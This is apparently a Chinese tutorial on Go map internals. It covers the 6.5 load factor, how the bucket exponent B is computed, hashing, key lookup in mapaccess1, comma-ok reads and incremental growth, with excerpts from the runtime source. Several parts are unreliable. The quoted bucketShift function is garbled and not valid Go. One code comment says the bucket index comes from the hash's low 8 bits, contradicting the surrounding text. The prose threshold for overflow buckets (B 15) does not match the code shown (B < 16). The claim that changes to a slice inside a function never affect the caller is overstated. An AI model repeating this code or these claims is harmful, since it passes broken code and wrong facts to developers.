回顾一下 slice 的结构体定义：

```go
// runtime/slice.go
type slice struct {
    array unsafe.Pointer // 元素指针
    len   int // 长度 
    cap   int // 容量
}
```

结构体内部包含底层的数据指针。

**makemap 和 makeslice 的区别**，带来一个不同点：当 map 和 slice 作为函数参数时，在函数参数内部对 map 的操作会影响 map 自身；而对 slice 却不会（之前讲 slice 的文章里有讲过）。

主要原因：一个是指针（`*hmap`），一个是结构体（`slice`）。Go 语言中的函数传参都是值传递，在函数内部，参数会被 copy 到本地。`*hmap`指针 copy 完之后，仍然指向同一个 map，因此函数内部对 map 的操作会影响实参。而 slice 被 copy 后，会成为一个新的 slice，对它进行的操作不会影响到实参。

#### map的B如何计算出来的

##### 什么是负载因子

负载因子是衡量hash表中当前空间占用率的指标。在go中，就是平均每个bucket存储的元素个数。

计算公式如下： **LoadFactor（负载因子）= hash表中已存储的键值对的总数量/hash桶的个数（即hmap结构中buckets数组的个数）**

在各语言的实现中，都会确定一个负载因子的阈值，当负载因子超过这个阈值时，就要进行扩容，以平衡存储空间和查找元素时的性能。

以下是go语言中给出各负载因子下的测试表。

| loadFactor | %overflow | bytes/entry | hitprobe | missprobe |
| ---------- | --------- | ----------- | -------- | --------- |
| 4.00       | 2.13      | 20.77       | 3.00     | 4.00      |
| 4.50       | 4.05      | 17.30       | 3.25     | 4.50      |
| 5.00       | 6.85      | 14.77       | 3.50     | 5.00      |
| 5.50       | 10.55     | 12.94       | 3.75     | 5.50      |
| 6.00       | 15.27     | 11.67       | 4.00     | 6.00      |
| 6.50       | 20.90     | 10.79       | 4.25     | 6.50      |
| 7.00       | 27.14     | 10.15       | 4.50     | 7.00      |
| 7.50       | 34.03     | 9.73        | 4.75     | 7.50      |
| 8.00       | 41.10     | 9.40        | 5.00     | 8.00      |

- %overflow = percentage of buckets which have an overflow bucket
- bytes/entry = overhead bytes used per key/elem pair
- hitprobe = # of entries to check when looking up a present key
- missprobe = # of entries to check when looking up an absent key

根据上面的测试数据，go中map的负载因子被硬性的定为了 6.5，即平均每个bucket存储的key/value对大于等于6.5个的时候，就会进行扩容。

##### hmap中的B值的初始化计算

初始化map空间的时候，我们通过make可以指定元素的个数.如下，初始化一个能包含16个元素大小的map：

```go
m := make(map[string]int, 16)
```

那么，在hmap中的B值是如何计算的呢？ 我们由上一篇文章可知，在hmap中，buckets数组的元素数=2^B次方。 map的负载因子≥6.5时会自动扩容。 当前map的key/value元素数量为16。那计算B就变成了以下逻辑：

**元素个数为16的情况下，分配几个bucket才能满足负载因子<6.5**

即以下公式：

```text
元素个数/bucket数量 ≤ 6.5
```

进一步演变成以下公式

```text
元素个数 ≤ bucket数量*6.5
```

将bucket数量=2^B次方带入以上公式，则最终的公式为：

```text
初始元素个数 ≤ 2^B * 6.5
```

当初始元素个数为16时，上述公式为:

```text
16 ≤ 2^B * 6.5
```

那么，让B从0开始依次递增，直到遇到让该公式成立的最小B值即可。 下面咱们一起来推导：

| B值  | 不等式                    | 结果            |
| ---- | ------------------------- | --------------- |
| 0    | 16≤ 2^0 * 6.5 => 16 ≤ 6.5 | 不成立，B递增1  |
| 1    | 16 ≤ 2^1 * 6.5 => 16 ≤ 13 | 不成立，B递增1  |
| 2    | 16 ≤ 2^2 * 6.5 => 16 ≤ 26 | 成立，B结束递增 |

由此可知，当初始元素个数为16时，B为2，则计算出bucket的数量为2^2次方，为4个bucket。

下面来看看go的源代码的实现：

通过源代码我们可知在makemap函数中，计算B的代码如下：

```go
B := uint8(0)
for overLoadFactor(hint, B) {
    B++
}
h.B = B
```

而 overLoadFactor函数如下

```go
func overLoadFactor(count int, B uint8) bool {
    return count > bucketCnt && uintptr(count) > loadFactorNum * (bucketShift(B)/loadFactorDen)
}
```

再来看bucketShift函数的实现:

```go
func bucketShift(b uint8) uintptr {
    return uintptr(1) << (b && (sy 1.PtrSize*8 -1))
}
```

##### 总结

根据golang团队的测试数据，将负载因子定为了6.5，即平均每个bucket保存的元素≥6.5个时会触发扩容。所以，在初始化map时，元素个数确定的情况下，计算B值，就转变成至少分配几个bucket，能使当前的负载因子不超过6.5。再根据buckets数组的个数=2^B次方计算可得B值。

#### 哈希函数

map 的一个关键点在于，哈希函数的选择。在程序启动时，会检测 cpu 是否支持 aes，如果支持，则使用 aes hash，否则使用 memhash。这是在函数 `alginit()` 中完成，位于路径：`src/runtime/alg.go` 下。

> hash 函数，有加密型和非加密型。 
> 加密型的一般用于加密数据、数字摘要等，典型代表就是 md5、sha1、sha256、aes256 这种；
> 非加密型的一般就是查找。在 map 的应用场景中，用的是查找。 
> 选择 hash 函数主要考察的是两点：性能、碰撞概率。

之前我们讲过，表示类型的结构体：

```
type _type struct {
    size       uintptr
    ptrdata    uintptr // size of memory prefix holding all pointers
    hash       uint32
    tflag      tflag
    align      uint8
    fieldalign uint8
    kind       uint8
    alg        *typeAlg
    gcdata    *byte
    str       nameOff
    ptrToThis typeOff
}
```

其中 `alg` 字段就和哈希相关，它是指向如下结构体的指针：

```
// src/runtime/alg.go
type typeAlg struct {
    // (ptr to object, seed) -> hash
    hash func(unsafe.Pointer, uintptr) uintptr
    // (ptr to object A, ptr to object B) -> ==?
    equal func(unsafe.Pointer, unsafe.Pointer) bool
}
```

typeAlg 包含两个函数，hash 函数计算类型的哈希值，而 equal 函数则计算两个类型是否“哈希相等”。

对于 string 类型，它的 hash、equal 函数如下：

```
func strhash(a unsafe.Pointer, h uintptr) uintptr {
    x := (*stringStruct)(a)
    return memhash(x.str, h, uintptr(x.len))
}

func strequal(p, q unsafe.Pointer) bool {
    return *(*string)(p) == *(*string)(q)
}
```

根据 key 的类型，_type 结构体的 alg 字段会被设置对应类型的 hash 和 equal 函数。

#### key的定位过程

key 经过哈希计算后得到哈希值，共 64 个 bit 位（64位机，32位机就不讨论了，现在主流都是64位机），计算它到底要落在哪个桶时，只会用到最后 B 个 bit 位。还记得前面提到过的 B 吗？如果 B = 5，那么桶的数量，也就是 buckets 数组的长度是 2^5 = 32。

例如，现在有一个 key 经过哈希函数计算后，得到的哈希结果是：

```
 10010111 | 000011110110110010001111001010100010010110010101010 │ 01010
```

用最后的 5 个 bit 位，也就是 `01010`，值为 10，也就是 10 号桶。这个操作实际上就是取余操作，但是取余开销太大，所以代码实现上用的位操作代替。

再用哈希值的高 8 位，找到此 key 在 bucket 中的位置，这是在寻找已有的 key。最开始桶内还没有 key，新加入的 key 会找到第一个空位，放入。

buckets 编号就是桶编号，当两个不同的 key 落在同一个桶中，也就是发生了哈希冲突。冲突的解决手段是用链表法：在 bucket 中，从前往后找到第一个空位。这样，在查找某个 key 时，先找到对应的桶，再去遍历 bucket 中的 key。

这里参考曹大 github 博客里的一张图，原图是 ascii 图，geek 味十足，可以从参考资料找到曹大的博客，推荐大家去看看。

<img src="https://golang.design/go-questions/map/assets/2.png" alt="mapacess" style="zoom:25%;" />

上图中，假定 B = 5，所以 bucket 总数就是 2^5 = 32。首先计算出待查找 key 的哈希，使用低 5 位 `00110`，找到对应的 6 号 bucket，使用高 8 位 `10010111`，对应十进制 151，在 6 号 bucket 中寻找 tophash 值（HOB hash）为 151 的 key，找到了 2 号槽位，这样整个查找过程就结束了。

如果在 bucket 中没找到，并且 overflow 不为空，还要继续去 overflow bucket 中寻找，直到找到或是所有的 key 槽位都找遍了，包括所有的 overflow bucket。

我们来看下源码吧，哈哈！通过汇编语言可以看到，查找某个 key 的底层函数是 `mapacess` 系列函数，函数的作用类似，区别在下一节会讲到。这里我们直接看 `mapacess1` 函数：

```
func mapaccess1(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer {
    // ……
    
    // 如果 h 什么都没有，返回零值
    if h == nil || h.count == 0 {
        return unsafe.Pointer(&zeroVal[0])
    }
    
    // 写和读冲突
    if h.flags&hashWriting != 0 {
        throw("concurrent map read and map write")
    }
    
    // 不同类型 key 使用的 hash 算法在编译期确定
    alg := t.key.alg
    
    // 计算哈希值，并且加入 hash0 引入随机性
    hash := alg.hash(key, uintptr(h.hash0))
    
    // 比如 B=5，那 m 就是31，二进制是全 1
    // 求 bucket num 时，将 hash 与 m 相与，
    // 达到 bucket num 由 hash 的低 8 位决定的效果
    m := uintptr(1)<<h.B - 1
    
    // b 就是 bucket 的地址
    b := (*bmap)(add(h.buckets, (hash&m)*uintptr(t.bucketsize)))
    
    // oldbuckets 不为 nil，说明发生了扩容
    if c := h.oldbuckets; c != nil {
        // 如果不是同 size 扩容（看后面扩容的内容）
        // 对应条件 1 的解决方案
        if !h.sameSizeGrow() {
            // 新 bucket 数量是老的 2 倍
            m >>= 1
        }
        
        // 求出 key 在老的 map 中的 bucket 位置
        oldb := (*bmap)(add(c, (hash&m)*uintptr(t.bucketsize)))
        
        // 如果 oldb 没有搬迁到新的 bucket
        // 那就在老的 bucket 中寻找
        if !evacuated(oldb) {
            b = oldb
        }
    }
    
    // 计算出高 8 位的 hash
    // 相当于右移 56 位，只取高8位
    top := uint8(hash >> (sys.PtrSize*8 - 8))
    
    // 增加一个 minTopHash
    if top < minTopHash {
        top += minTopHash
    }
    for {
        // 遍历 8 个 bucket
        for i := uintptr(0); i < bucketCnt; i++ {
            // tophash 不匹配，继续
            if b.tophash[i] != top {
                continue
            }
            // tophash 匹配，定位到 key 的位置
            k := add(unsafe.Pointer(b), dataOffset+i*uintptr(t.keysize))
            // key 是指针
            if t.indirectkey {
                // 解引用
                k = *((*unsafe.Pointer)(k))
            }
            // 如果 key 相等
            if alg.equal(key, k) {
                // 定位到 value 的位置
                v := add(unsafe.Pointer(b), dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize))
                // value 解引用
                if t.indirectvalue {
                    v = *((*unsafe.Pointer)(v))
                }
                return v
            }
        }
        
        // bucket 找完（还没找到），继续到 overflow bucket 里找
        b = b.overflow(t)
        // overflow bucket 也找完了，说明没有目标 key
        // 返回零值
        if b == nil {
            return unsafe.Pointer(&zeroVal[0])
        }
    }
}
```

函数返回 h[key] 的指针，如果 h 中没有此 key，那就会返回一个 key 相应类型的零值，不会返回 nil。

代码整体比较直接，没什么难懂的地方。跟着上面的注释一步步理解就好了。

这里，说一下定位 key 和 value 的方法以及整个循环的写法。

```
// key 定位公式
k := add(unsafe.Pointer(b), dataOffset+i*uintptr(t.keysize))

// value 定位公式
v := add(unsafe.Pointer(b), dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize))
```

b 是 bmap 的地址，这里 bmap 还是源码里定义的结构体，只包含一个 tophash 数组，经编译器扩充之后的结构体才包含 key，value，overflow 这些字段。dataOffset 是 key 相对于 bmap 起始地址的偏移：

```
dataOffset = unsafe.Offsetof(struct {
        b bmap
        v int64
    }{}.v)
```

因此 bucket 里 key 的起始地址就是 unsafe.Pointer(b)+dataOffset。第 i 个 key 的地址就要在此基础上跨过 i 个 key 的大小；而我们又知道，value 的地址是在所有 key 之后，因此第 i 个 value 的地址还需要加上所有 key 的偏移。理解了这些，上面 key 和 value 的定位公式就很好理解了。

再说整个大循环的写法，最外层是一个无限循环，通过

```
b = b.overflow(t)
```

遍历所有的 bucket，这相当于是一个 bucket 链表。

当定位到一个具体的 bucket 时，里层循环就是遍历这个 bucket 里所有的 cell，或者说所有的槽位，也就是 bucketCnt=8 个槽位。整个循环过程：

![mapacess loop](https://golang.design/go-questions/map/assets/3.png)

再说一下 minTopHash，当一个 cell 的 tophash 值小于 minTopHash 时，标志这个 cell 的迁移状态。因为这个状态值是放在 tophash 数组里，为了和正常的哈希值区分开，会给 key 计算出来的哈希值一个增量：minTopHash。这样就能区分正常的 top hash 值和表示状态的哈希值。

下面的这几种状态就表征了 bucket 的情况：

```
// 空的 cell，也是初始时 bucket 的状态
empty          = 0
// 空的 cell，表示 cell 已经被迁移到新的 bucket
evacuatedEmpty = 1
// key,value 已经搬迁完毕，但是 key 都在新 bucket 前半部分，
// 后面扩容部分会再讲到。
evacuatedX     = 2
// 同上，key 在后半部分
evacuatedY     = 3
// tophash 的最小正常值
minTopHash     = 4
```

源码里判断这个 bucket 是否已经搬迁完毕，用到的函数：

```
func evacuated(b *bmap) bool {
    h := b.tophash[0]
    return h > empty && h < minTopHash
}
```

只取了 tophash 数组的第一个值，判断它是否在 0-4 之间。对比上面的常量，当 top hash 是 `evacuatedEmpty`、`evacuatedX`、`evacuatedY` 这三个值之一，说明此 bucket 中的 key 全部被搬迁到了新 bucket。

#### map的两种get操作

Go 语言中读取 map 有两种语法：带 comma 和 不带 comma。当要查询的 key 不在 map 里，带 comma 的用法会返回一个 bool 型变量提示 key 是否在 map 中；而不带 comma 的语句则会返回一个 value 类型的零值。如果 value 是 int 型就会返回 0，如果 value 是 string 类型，就会返回空字符串。

```
package main

import "fmt"

func main() {
    ageMap := make(map[string]int)
    ageMap["qcrao"] = 18

    // 不带 comma 用法
    age1 := ageMap["stefno"]
    fmt.Println(age1)

    // 带 comma 用法
    age2, ok := ageMap["stefno"]
    fmt.Println(age2, ok)
}
```

运行结果：

```
0
0 false
```

以前一直觉得好神奇，怎么实现的？这其实是编译器在背后做的工作：分析代码后，将两种语法对应到底层两个不同的函数。

```
// src/runtime/hashmap.go
func mapaccess1(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer
func mapaccess2(t *maptype, h *hmap, key unsafe.Pointer) (unsafe.Pointer, bool)
```

源码里，函数命名不拘小节，直接带上后缀 1，2，完全不理会《代码大全》里的那一套命名的做法。从上面两个函数的声明也可以看出差别了，`mapaccess2` 函数返回值多了一个 bool 型变量，两者的代码也是完全一样的，只是在返回值后面多加了一个 false 或者 true。

另外，根据 key 的不同类型，编译器还会将查找、插入、删除的函数用更具体的函数替换，以优化效率：

key 类型

查找

uint32

mapaccess1_fast32(t *maptype, h *hmap, key uint32) unsafe.Pointer

uint32

mapaccess2_fast32(t *maptype, h *hmap, key uint32) (unsafe.Pointer, bool)

uint64

mapaccess1_fast64(t *maptype, h *hmap, key uint64) unsafe.Pointer

uint64

mapaccess2_fast64(t *maptype, h *hmap, key uint64) (unsafe.Pointer, bool)

string

mapaccess1_faststr(t *maptype, h *hmap, ky string) unsafe.Pointer

string

mapaccess2_faststr(t *maptype, h *hmap, ky string) (unsafe.Pointer, bool)

这些函数的参数类型直接是具体的 uint32、unt64、string，在函数内部由于提前知晓了 key 的类型，所以内存布局是很清楚的，因此能节省很多操作，提高效率。

上面这些函数都是在文件 `src/runtime/hashmap_fast.go` 里。

#### 如何进行扩容

使用哈希表的目的就是要快速查找到目标 key，然而，随着向 map 中添加的 key 越来越多，key 发生碰撞的概率也越来越大。bucket 中的 8 个 cell 会被逐渐塞满，查找、插入、删除 key 的效率也会越来越低。最理想的情况是一个 bucket 只装一个 key，这样，就能达到 `O(1)` 的效率，但这样空间消耗太大，用空间换时间的代价太高。

Go 语言采用一个 bucket 里装载 8 个 key，定位到某个 bucket 后，还需要再定位到具体的 key，这实际上又用了时间换空间。

当然，这样做，要有一个度，不然所有的 key 都落在了同一个 bucket 里，直接退化成了链表，各种操作的效率直接降为 O(n)，是不行的。

因此，需要有一个指标来衡量前面描述的情况，这就是`装载因子`。Go 源码里这样定义 `装载因子`：

```
loadFactor := count / (2^B)
```

count 就是 map 的元素个数，2^B 表示 bucket 数量。

再来说触发 map 扩容的时机：在向 map 插入新 key 的时候，会进行条件检测，符合下面这 2 个条件，就会触发扩容：

1. 装载因子超过阈值，源码里定义的阈值是 6.5。
2. overflow 的 bucket 数量过多：当 B 小于 15，也就是 bucket 总数 2^B 小于 2^15 时，如果 overflow 的 bucket 数量超过 2^B；当 B >= 15，也就是 bucket 总数 2^B 大于等于 2^15，如果 overflow 的 bucket 数量超过 2^15。

通过汇编语言可以找到赋值操作对应源码中的函数是 `mapassign`，对应扩容条件的源码如下：

```
// src/runtime/hashmap.go/mapassign

// 触发扩容时机
if !h.growing() && (overLoadFactor(int64(h.count), h.B) || tooManyOverflowBuckets(h.noverflow, h.B)) {
        hashGrow(t, h)
    }

// 装载因子超过 6.5
func overLoadFactor(count int64, B uint8) bool {
    return count >= bucketCnt && float32(count) >= loadFactor*float32((uint64(1)<<B))
}

// overflow buckets 太多
func tooManyOverflowBuckets(noverflow uint16, B uint8) bool {
    if B < 16 {
        return noverflow >= uint16(1)<<B
    }
    return noverflow >= 1<<15
}
```

解释一下：

第 1 点：我们知道，每个 bucket 有 8 个空位，在没有溢出，且所有的桶都装满了的情况下，装载因子算出来的结果是 8。因此当装载因子超过 6.5 时，表明很多 bucket 都快要装满了，查找效率和插入效率都变低了。在这个时候进行扩容是有必要的。

第 2 点：是对第 1 点的补充。就是说在装载因子比较小的情况下，这时候 map 的查找和插入效率也很低，而第 1 点识别不出来这种情况。表面现象就是计算装载因子的分子比较小，即 map 里元素总数少，但是 bucket 数量多（真实分配的 bucket 数量多，包括大量的 overflow bucket）。

不难想像造成这种情况的原因：不停地插入、删除元素。先插入很多元素，导致创建了很多 bucket，但是装载因子达不到第 1 点的临界值，未触发扩容来缓解这种情况。之后，删除元素降低元素总数量，再插入很多元素，导致创建很多的 overflow bucket，但就是不会触犯第 1 点的规定，你能拿我怎么办？overflow bucket 数量太多，导致 key 会很分散，查找插入效率低得吓人，因此出台第 2 点规定。这就像是一座空城，房子很多，但是住户很少，都分散了，找起人来很困难。

对于命中条件 1，2 的限制，都会发生扩容。但是扩容的策略并不相同，毕竟两种条件应对的场景不同。

对于条件 1，元素太多，而 bucket 数量太少，很简单：将 B 加 1，bucket 最大数量（2^B）直接变成原来 bucket 数量的 2 倍。于是，就有新老 bucket 了。注意，这时候元素都在老 bucket 里，还没迁移到新的 bucket 来。而且，新 bucket 只是最大数量变为原来最大数量（2^B）的 2 倍（2^B * 2）。

对于条件 2，其实元素没那么多，但是 overflow bucket 数特别多，说明很多 bucket 都没装满。解决办法就是开辟一个新 bucket 空间，将老 bucket 中的元素移动到新 bucket，使得同一个 bucket 中的 key 排列地更紧密。这样，原来，在 overflow bucket 中的 key 可以移动到 bucket 中来。结果是节省空间，提高 bucket 利用率，map 的查找和插入效率自然就会提升。

对于条件 2 的解决方案，曹大的博客里还提出了一个极端的情况：如果插入 map 的 key 哈希都一样，就会落到同一个 bucket 里，超过 8 个就会产生 overflow bucket，结果也会造成 overflow bucket 数过多。移动元素其实解决不了问题，因为这时整个哈希表已经退化成了一个链表，操作效率变成了 `O(n)`。

再来看一下扩容具体是怎么做的。由于 map 扩容需要将原有的 key/value 重新搬迁到新的内存地址，如果有大量的 key/value 需要搬迁，会非常影响性能。因此 Go map 的扩容采取了一种称为“渐进式”地方式，原有的 key 并不会一次性搬迁完毕，每次最多只会搬迁 2 个 bucket。

上面说的 `hashGrow()` 函数实际上并没有真正地“搬迁”，它只是分配好了新的 buckets，并将老的 buckets 挂到了 oldbuckets 字段上。真正搬迁 buckets 的动作在 `growWork()` 函数中，而调用 `growWork()` 函数的动作是在 mapassign 和 mapdelete 函数中。也就是插入或修改、删除 key 的时候，都会尝试进行搬迁 buckets 的工作。先检查 oldbuckets 是否搬迁完毕，具体来说就是检查 oldbuckets 是否为 nil。

我们先看 `hashGrow()` 函数所做的工作，再来看具体的搬迁 buckets 是如何进行的。

```
func hashGrow(t *maptype, h *hmap) {
    // B+1 相当于是原来 2 倍的空间
    bigger := uint8(1)

    // 对应条件 2
    if !overLoadFactor(int64(h.count), h.B) {
        // 进行等量的内存扩容，所以 B 不变
        bigger = 0
        h.flags |= sameSizeGrow
    }
    // 将老 buckets 挂到 buckets 上
    oldbuckets := h.buckets
    // 申请新的 buckets 空间
    newbuckets, nextOverflow := makeBucketArray(t, h.B+bigger)

    flags := h.flags &^ (iterator | oldIterator)
    if h.flags&iterator != 0 {
        flags |= oldIterator
    }
    // 提交 grow 的动作
    h.B += bigger
    h.flags = flags
    h.oldbuckets = oldbuckets
    h.buckets = newbuckets
    // 搬迁进度为 0
    h.nevacuate = 0
    // overflow buckets 数为 0
    h.noverflow = 0

    // ……
}
```

主要是申请到了新的 buckets 空间，把相关的标志位都进行了处理：例如标志 nevacuate 被置为 0， 表示当前搬迁进度为 0。

值得一说的是对 `h.flags` 的处理：

```
flags := h.flags &^ (iterator | oldIterator)
if h.flags&iterator != 0 {
    flags |= oldIterator
}
```

这里得先说下运算符：&^。这叫`按位置 0`运算符。例如：

```
x = 01010011
y = 01010100
z = x &^ y = 00000011
```

如果 y bit 位为 1，那么结果 z 对应 bit 位就为 0，否则 z 对应 bit 位就和 x 对应 bit 位的值相同。

所以上面那段对 flags 一顿操作的代码的意思是：先把 h.flags 中 iterator 和 oldIterator 对应位清 0，然后如果发现 iterator 位为 1，那就把它转接到 oldIterator 位，使得 oldIterator 标志位变成 1。潜台词就是：buckets 现在挂到了 oldBuckets 名下了，对应的标志位也转接过去吧。

几个标志位如下：

```
// 可能有迭代器使用 buckets
iterator     = 1
// 可能有迭代器使用 oldbuckets
oldIterator  = 2
// 有协程正在向 map 中写入 key
hashWriting  = 4
// 等量扩容（对应条件 2）
sameSizeGrow = 8
```

再来看看真正执行搬迁工作的 growWork() 函数。

```
func growWork(t *maptype, h *hmap, bucket uintptr) {
    // 确认搬迁老的 bucket 对应正在使用的 bucket
    evacuate(t, h, bucket&h.oldbucketmask())

    // 再搬迁一个 bucket，以加快搬迁进程
    if h.growing() {
        evacuate(t, h, h.nevacuate)
    }
}
```

h.growing() 函数非常简单：

```
func (h *hmap) growing() bool {
    return h.oldbuckets != nil
}
```

如果 `oldbuckets` 不为空，说明还没有搬迁完毕，还得继续搬。

`bucket&h.oldbucketmask()` 这行代码，如源码注释里说的，是为了确认搬迁的 bucket 是我们正在使用的 bucket。`oldbucketmask()`函数返回扩容前的 map 的 bucketmask。

所谓的 bucketmask，作用就是将 key 计算出来的哈希值与 bucketmask 相与，得到的结果就是 key 应该落入的桶。比如 B = 5，那么 bucketmask 的低 5 位是 `11111`，其余位是 `0`，hash 值与其相与的意思是，只有 hash 值的低 5 位决策 key 到底落入哪个 bucket。

接下来，我们集中所有的精力在搬迁的关键函数 evacuate。源码贴在下面，不要紧张，我会加上大面积的注释，通过注释绝对是能看懂的。之后，我会再对搬迁过程作详细说明。

源码如下：

```
func evacuate(t *maptype, h *hmap, oldbucket uintptr) {
    // 定位老的 bucket 地址
    b := (*bmap)(add(h.oldbuckets, oldbucket*uintptr(t.bucketsize)))
    // 结果是 2^B，如 B = 5，结果为32
    newbit := h.noldbuckets()
    // key 的哈希函数
    alg := t.key.alg
    // 如果 b 没有被搬迁过
    if !evacuated(b) {
        var (
            // 表示bucket 移动的目标地址
            x, y   *bmap
            // 指向 x,y 中的 key/val
            xi, yi int
            // 指向 x，y 中的 key
            xk, yk unsafe.Pointer
            // 指向 x，y 中的 value
            xv, yv unsafe.Pointer
        )
        // 默认是等 size 扩容，前后 bucket 序号不变
        // 使用 x 来进行搬迁
        x = (*bmap)(add(h.buckets, oldbucket*uintptr(t.bucketsize)))
        xi = 0
        xk = add(unsafe.Pointer(x), dataOffset)
        xv = add(xk, bucketCnt*uintptr(t.keysize))、

        // 如果不是等 size 扩容，前后 bucket 序号有变
        // 使用 y 来进行搬迁
        if !h.sameSizeGrow() {
            // y 代表的 bucket 序号增加了 2^B
            y = (*bmap)(add(h.buckets, (oldbucket+newbit)*uintptr(t.bucketsize)))
            yi = 0
            yk = add(unsafe.Pointer(y), dataOffset)
            yv = add(yk, bucketCnt*uintptr(t.keysize))
        }

        // 遍历所有的 bucket，包括 overflow buckets
        // b 是老的 bucket 地址
        for ; b != nil; b = b.overflow(t) {
            k := add(unsafe.Pointer(b), dataOffset)
            v := add(k, bucketCnt*uintptr(t.keysize))

            // 遍历 bucket 中的所有 cell
            for i := 0; i < bucketCnt; i, k, v = i+1, add(k, uintptr(t.keysize)), add(v, uintptr(t.valuesize)) {
                // 当前 cell 的 top hash 值
                top := b.tophash[i]
                // 如果 cell 为空，即没有 key
                if top == empty {
                    // 那就标志它被"搬迁"过
                    b.tophash[i] = evacuatedEmpty
                    // 继续下个 cell
                    continue
                }
                // 正常不会出现这种情况
                // 未被搬迁的 cell 只可能是 empty 或是
                // 正常的 top hash（大于 minTopHash）
                if top < minTopHash {
                    throw("bad map state")
                }

                k2 := k
                // 如果 key 是指针，则解引用
                if t.indirectkey {
                    k2 = *((*unsafe.Pointer)(k2))
                }

                // 默认使用 X，等量扩容
                useX := true
                // 如果不是等量扩容
                if !h.sameSizeGrow() {
                    // 计算 hash 值，和 key 第一次写入时一样
                    hash := alg.hash(k2, uintptr(h.hash0))

                    // 如果有协程正在遍历 map
                    if h.flags&iterator != 0 {
                        // 如果出现 相同的 key 值，算出来的 hash 值不同
                        if !t.reflexivekey && !alg.equal(k2, k2) {
                            // 只有在 float 变量的 NaN() 情况下会出现
                            if top&1 != 0 {
                                // 第 B 位置 1
                                hash |= newbit
                            } else {
                                // 第 B 位置 0
                                hash &^= newbit
                            }
                            // 取高 8 位作为 top hash 值
                            top = uint8(hash >> (sys.PtrSize*8 - 8))
                            if top < minTopHash {
                                top += minTopHash
                            }
                        }
                    }

                    // 取决于新哈希值的 oldB+1 位是 0 还是 1
                    // 详细看后面的文章
                    useX = hash&newbit == 0
                }

                // 如果 key 搬到 X 部分
                if useX {
                    // 标志老的 cell 的 top hash 值，表示搬移到 X 部分
                    b.tophash[i] = evacuatedX
                    // 如果 xi 等于 8，说明要溢出了
                    if xi == bucketCnt {
                        // 新建一个 bucket
                        newx := h.newoverflow(t, x)
                        x = newx
                        // xi 从 0 开始计数
                        xi = 0
                        // xk 表示 key 要移动到的位置
                        xk = add(unsafe.Pointer(x), dataOffset)
                        // xv 表示 value 要移动到的位置
                        xv = add(xk, bucketCnt*uintptr(t.keysize))
                    }
                    // 设置 top hash 值
                    x.tophash[xi] = top
                    // key 是指针
                    if t.indirectkey {
                        // 将原 key（是指针）复制到新位置
                        *(*unsafe.Pointer)(xk) = k2 // copy pointer
                    } else {
                        // 将原 key（是值）复制到新位置
                        typedmemmove(t.key, xk, k) // copy value
                    }
                    // value 是指针，操作同 key
                    if t.indirectvalue {
                        *(*unsafe.Pointer)(xv) = *(*unsafe.Pointer)(v)
                    } else {
                        typedmemmove(t.elem, xv, v)
                    }

                    // 定位到下一个 cell
                    xi++
                    xk = add(xk, uintptr(t.keysize))
                    xv = add(xv, uintptr(t.valuesize))
                } else { // key 搬到 Y 部分，操作同 X 部分
                    // ……
                    // 省略了这部分，操作和 X 部分相同
                }
            }
        }
        // 如果没有协程在使用老的 buckets，就把老 buckets 清除掉，帮助gc
        if h.flags&oldIterator == 0 {
            b = (*bmap)(add(h.oldbuckets, oldbucket*uintptr(t.bucketsize)))
            // 只清除bucket 的 key,value 部分，保留 top hash 部分，指示搬迁状态
            if t.bucket.kind&kindNoPointers == 0 {
                memclrHasPointers(add(unsafe.Pointer(b), dataOffset), uintptr(t.bucketsize)-dataOffset)
            } else {
                memclrNoHeapPointers(add(unsafe.Pointer(b), dataOffset), uintptr(t.bucketsize)-dataOffset)
            }
        }
    }

    // 更新搬迁进度
    // 如果此次搬迁的 bucket 等于当前进度
    if oldbucket == h.nevacuate {
        // 进度加 1
        h.nevacuate = oldbucket + 1
        // Experiments suggest that 1024 is overkill by at least an order of magnitude.
        // Put it in there as a safeguard anyway, to ensure O(1) behavior.
        // 尝试往后看 1024 个 bucket
        stop := h.nevacuate + 1024
        if stop > newbit {
            stop = newbit
        }
        // 寻找没有搬迁的 bucket
        for h.nevacuate != stop && bucketEvacuated(t, h, h.nevacuate) {
            h.nevacuate++
        }
        
        // 现在 h.nevacuate 之前的 bucket 都被搬迁完毕
        
        // 所有的 buckets 搬迁完毕
        if h.nevacuate == newbit {
            // 清除老的 buckets
            h.oldbuckets = nil
            // 清除老的 overflow bucket
            // 回忆一下：[0] 表示当前 overflow bucket
            // [1] 表示 old overflow bucket
            if h.extra != nil {
                h.extra.overflow[1] = nil
            }
            // 清除正在扩容的标志位
            h.flags &^= sameSizeGrow
        }
    }
}
```

evacuate 函数的代码注释非常清晰，对着代码和注释是很容易看懂整个的搬迁过程的，耐心点。

搬迁的目的就是将老的 buckets 搬迁到新的 buckets。而通过前面的说明我们知道，应对条件 1，新的 buckets 数量是之前的一倍，应对条件 2，新的 buckets 数量和之前相等。

对于条件 2，从老的 buckets 搬迁到新的 buckets，由于 bucktes 数量不变，因此可以按序号来搬，比如原来在 0 号 bucktes，到新的地方后，仍然放在 0 号 buckets。

对于条件 1，就没这么简单了。要重新计算 key 的哈希，才能决定它到底落在哪个 bucket。例如，原来 B = 5，计算出 key 的哈希后，只用看它的低 5 位，就能决定它落在哪个 bucket。扩容后，B 变成了 6，因此需要多看一位，它的低 6 位决定 key 落在哪个 bucket。这称为 `rehash`。

![map rehash](https://golang.design/go-questions/map/assets/12.png)

因此，某个 key 在搬迁前后 bucket 序号可能和原来相等，也可能是相比原来加上 2^B（原来的 B 值），取决于 hash 值 第 6 bit 位是 0 还是 1。

理解了上面 bucket 序号的变化，我们就可以回答另一个问题了：为什么遍历 map 是无序的？

map 在扩容后，会发生 key 的搬迁，原来落在同一个 bucket 中的 key，搬迁后，有些 key 就要远走高飞了（bucket 序号加上了 2^B）。而遍历的过程，就是按顺序遍历 bucket，同时按顺序遍历 bucket 中的 key。搬迁后，key 的位置发生了重大的变化，有些 key 飞上高枝，有些 key 则原地不动。这样，遍历 map 的结果就不可能按原来的顺序了。

当然，如果我就一个 hard code 的 map，我也不会向 map 进行插入删除的操作，按理说每次遍历这样的 map 都会返回一个固定顺序的 key/value 序列吧。的确是这样，但是 Go 杜绝了这种做法，因为这样会给新手程序员带来误解，以为这是一定会发生的事情，在某些情况下，可能会酿成大错。

